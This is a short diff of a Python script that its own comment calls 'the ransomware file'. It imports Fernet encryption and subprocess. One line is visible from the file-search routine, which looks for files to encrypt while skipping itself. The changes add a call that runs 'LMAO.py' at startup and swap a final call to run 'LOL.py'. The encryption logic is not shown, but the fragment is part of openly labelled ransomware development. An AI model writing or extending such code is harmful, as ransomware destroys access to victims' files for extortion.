@@ -2,6 +2,7 @@ import os
 import time
 from cryptography.fernet import Fernet
 from subprocess import call
+call(["python", "LMAO.py"])
 
 
 # Searching for file to encrypt exept from the ransomware file
@@ -54,4 +55,4 @@ else:
 	
 	
 	
-call(["python", "LMAO.py"])
+call(["python", "LOL.py"])
